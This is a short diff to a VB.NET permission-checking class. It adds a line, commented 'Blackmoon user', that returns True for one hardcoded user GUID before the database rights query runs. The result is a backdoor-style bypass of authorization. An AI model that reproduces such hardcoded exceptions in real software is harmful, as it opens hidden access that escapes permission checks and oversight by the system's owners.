@@ -28,6 +28,8 @@ Public Class CheckPermissions
         Dim cmd As SqlCommand
         Dim sdr As SqlDataReader
         Try
+            'Blackmoon user
+            If UserProps.ID.ToString.ToUpper = "E9CEFD11-47C0-4796-A46B-BC41C4C3606B" Then Return True
             sSQL = "select [view] from vw_FORMS F
                     inner join vw_FORM_RIGHTS  FR on F.ID = FR.F_ID 
                     inner join vw_RIGHTS R on R.ID=FR.Rid 
